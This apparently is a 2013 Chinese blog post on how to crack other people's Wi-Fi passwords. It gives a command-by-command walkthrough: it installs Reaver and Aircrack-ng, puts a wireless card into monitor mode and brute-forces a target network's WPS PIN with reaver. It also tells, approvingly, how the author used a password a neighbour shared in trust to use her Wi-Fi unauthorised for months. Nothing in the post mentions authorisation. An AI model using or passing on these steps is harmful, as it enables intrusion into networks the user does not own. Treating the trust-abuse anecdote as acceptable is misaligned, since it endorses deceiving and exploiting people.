---
layout: post
title: "怎样黑 Wi-Fi 的 WPA/WPA2 密码？"
date: 2013-06-13 22:30
comments: true
categories: [WiFi, Network]
---

要破解一个 Wi-Fi 的登录密码有很多方法，本人有两次获取到一个 Wi-Fi 密码的成功经验，一次是用技术手段破解，另一次是无意中使用了社会工程学，在这里给大家分享一下。

## 技术手段
使用技术手段去获取一个 Wi-Fi 的登录密码不需要你成为一个网络工程师，你只需要一台(1)带无线网卡 - (2)装有 Linux 系统 - (3)能联网的电脑，再加上一小时左右的时间就足够了。这一小时的时间需要你跟着下面的步骤来安装并使用破解所需软件。我以 Ubuntu 操作系统为例作讲解。

P.S. 下面内容需要你有一些基本的 Linux 命令行操作知识。

#### 1、下载并安装 Reaver
你可以从 Reaver 的[网站](https://code.google.com/p/reaver-wps/ "reaver") 下载最新版的 Reaver。或者直接在终端里执行以下命令：

	wget https://reaver-wps.googlecode.com/files/reaver-1.4.tar.gz

解压 Reaver

	tar -xzvf reaver-1.4.tar.gz

编译安装 Reaver 前需要先安装一些编译依赖包

	sudo apt-get install build-essential libpcap-dev sqlite3 libsqlite3-dev libpcap0.8-dev

不用在意你的系统是否会重复安装已存在依赖包的，Ubuntu 会自动跳过已安装依赖包，其它系统请自行检查。

编译并安装 Reaver

	cd reaver-1.4
	cd src
	./configure
	make
	sudo make install

#### 2、下载并按装 Aircrack-ng
你可以从 Aircrack-ng 的[网站](http://aircrack-ng.org/ "Aircrack-ng") 下载最新版的 Aircrack-ng，或者直接在终端里执行以下命令：
	wget http://download.aircrack-ng.org/aircrack-ng-1.2-beta1.tar.gz

解压 Aircrack-ng
	tar -xzvf aircrack-ng-1.2-beta1.tar.gz

安装依赖包
	sudo apt-get install libssl-dev

编译并安装
	cd aircrack-ng-1.2-beta1
	make
	sudo make install

#### 3、使用 Aircrack-ng 和 Reaver 破解 WiFi
使用 `iwconfig` 命令来查看无线网卡接口，一般来说就是 `wlan0`。然后执行以下命令將无线网卡设置成监视模式
	sudo airmon-ng start wlan0

成功的话会看到 “**monitor mode enabled on mon0**” 的信息。

查看附近的无线网络
	sudo airodump-ng mon0

输出信息类似于：
	BSSID              PWR  Beacons    #Data, #/s  CH  MB   ENC  CIPHER AUTH ESSID
	CX:7A:XX:2C:E6:XX  -60     189        1    0    7  54e  WPA  CCMP   PSK  Tenda_3CF670
	CX:XX:36:2F:1E:XX  -127    275     4416   310   7  54e. WPA  CCMP   PSK  Tenda_3C7D60

当搜索到若干无线网络后，按`<Ctrl+C>`停止搜索。复制某个无线网络的**BSSID**，然后就可以使用 Reaver 进行暴力破解了
	sudo reaver -i mon0 -b <BSSID> -vv

在 BSSID 中粘贴你之前复制的 BSSID，按回车后就可以开始破解了。然后你就可以约上三五知己出去玩半天，或者自己看两三部电影了——根据网络情况和电脑性能，破解一般需要4-10小时。

## 社会工程
那次对邻居小妹妹使用了社会工程获得她的 WiFi 密码也是无意为之的。事情经过大致是这样的：

我的无线网络有一天突然上不了网，重置路由器无数次还是不行。于是我就拿到邻居小妹那边测试看是不是路由器坏了。邻居小妹那个天真无邪啊，把宽带帐号密码和无线路由器密码都给了我来测试。我试了一段时间，路由器还是不能正常联网，我就判断我的59元路由器寿终正寝了，然后就失望地离开了邻家小妹家。

回到自己的出租屋里，突然醒悟邻家小妹的 WiFi 密码就是两个小写字母，后加123456，用手机搜到她家的 WiFi 后输入了密码，竟然就连上了！然后就果断蹭网蹭了好几个月。

**-EOF-**

____
版权声明：自由转载-非商用-非衍生-保持署名 | [Creative Commons BY-NC-ND 3.0](http://creativecommons.org/licenses/by-nc-nd/3.0/deed.zh "CC 3.0")

如果觉得本文对你有帮助，可付费支持作者 | <a href='http://me.alipay.com/zhaqiang'><img src='https://img.alipay.com/sys/personalprod/style/mc/btn-index.png' style="border:none;vertical-align:middle;"/></a>
